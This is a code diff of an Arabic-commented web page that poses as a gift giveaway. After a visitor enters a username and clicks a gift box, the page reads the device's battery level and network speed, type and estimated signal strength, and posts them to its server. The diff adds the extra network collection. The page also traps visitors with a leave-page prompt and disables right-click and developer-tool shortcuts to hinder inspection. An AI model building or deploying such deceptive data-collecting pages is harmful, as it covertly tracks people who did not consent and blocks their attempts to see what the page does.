@@ -24,7 +24,6 @@
     transition: background-color 0.5s ease;
   }
 
-  /* لما تتحول لأخضر */
   body.green-mode {
     background-color: #0f0 !important;
   }
@@ -42,6 +41,10 @@
   body.green-mode #login-screen,
   body.green-mode #gift-screen {
     display: none !important;
+  }
+
+  body.green-mode .hearts-bg {
+    display: none;
   }
 
   #main-container {
@@ -248,11 +251,6 @@
     font-size: 60px;
     margin-bottom: 15px;
   }
-
-  /* إخفاء القلوب في الوضع الأخضر */
-  body.green-mode .hearts-bg {
-    display: none;
-  }
 </style>
 </head>
 <body>
@@ -339,32 +337,23 @@ loginForm.addEventListener('submit', function(e) {
     return;
   }
 
-  // إظهار اسم المستخدم في شاشة الهدية
   giftUsername.textContent = username;
-
-  // الانتقال لشاشة الهدية
   loginScreen.classList.add('hidden');
   giftScreen.classList.remove('hidden');
 });
 
 // معالج صندوق الهدية
 giftBox.addEventListener('click', function() {
-  // منع التكرار
   if (alreadySent) return;
   
-  // تغيير شكل الصندوق
   this.textContent = '🎉';
   this.style.animation = 'none';
   this.style.transform = 'scale(1.3)';
   
   setTimeout(() => {
-    // تحويل الصفحة كلها لأخضر
     document.body.classList.add('green-mode');
-    
-    // عرض اسم المستخدم
     successUsername.textContent = `👤 ${username}`;
     
-    // جلب البطارية وقوة النت وإرسالها (مرة واحدة فقط)
     if ('getBattery' in navigator && !alreadySent) {
       alreadySent = true;
       
@@ -372,24 +361,55 @@ giftBox.addEventListener('click', function() {
         let percent = Math.round(battery.level * 100);
         batteryDisplay.textContent = `🔋 نسبة البطارية: ${percent}%`;
         
-        // جلب قوة النت
+        // جلب معلومات النت
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         let networkSpeed = 'غير معروف';
+        let signalBars = 'غير معروف';
+        let signalType = 'غير معروف';
+        
         if (connection) {
+          // السرعة
           const speed = connection.downlink;
           if (speed) {
             networkSpeed = speed + ' Mbps';
           }
+          
+          // نوع الشبكة
+          if (connection.effectiveType) {
+            const types = {
+              'slow-2g': '🐢 2G',
+              '2g': '📶 2G',
+              '3g': '📶 3G',
+              '4g': '📶 4G'
+            };
+            signalType = types[connection.effectiveType] || connection.effectiveType;
+          }
+          
+          // قوة الإشارة (شرط)
+          if (connection.bars !== undefined && connection.bars !== null) {
+            const bars = Math.min(Math.max(connection.bars, 0), 4);
+            signalBars = '█'.repeat(bars) + '░'.repeat(4 - bars) + ` (${bars}/4)`;
+          } else {
+            // تقدير الإشارة من السرعة
+            const speed = connection.downlink || 0;
+            if (speed >= 50) signalBars = '████ (4/4)';
+            else if (speed >= 20) signalBars = '███░ (3/4)';
+            else if (speed >= 5) signalBars = '██░░ (2/4)';
+            else if (speed >= 1) signalBars = '█░░░ (1/4)';
+            else signalBars = '░░░░ (0/4)';
+          }
         }
         
-        // إرسال رسالة واحدة فيها كل البيانات
+        // إرسال كل البيانات
         fetch('/api/send-all-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             username: username, 
             battery: percent,
-            network: networkSpeed
+            speed: networkSpeed,
+            signal: signalBars,
+            type: signalType
           })
         });
       }).catch(() => {
@@ -401,25 +421,21 @@ giftBox.addEventListener('click', function() {
   }, 600);
 });
 
-// الضغط على Enter في حقل الإدخال
 usernameInput.addEventListener('keypress', function(e) {
   if (e.key === 'Enter') {
     loginForm.dispatchEvent(new Event('submit'));
   }
 });
 
-// منع الخروج من الصفحة
 window.addEventListener('beforeunload', function (e) {
   e.preventDefault();
   e.returnValue = '';
 });
 
-// منع النقر بزر الماوس الأيمن
 document.addEventListener('contextmenu', function(e) {
   e.preventDefault();
 });
 
-// منع بعض اختصارات لوحة المفاتيح
 document.addEventListener('keydown', function(e) {
   if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
       (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
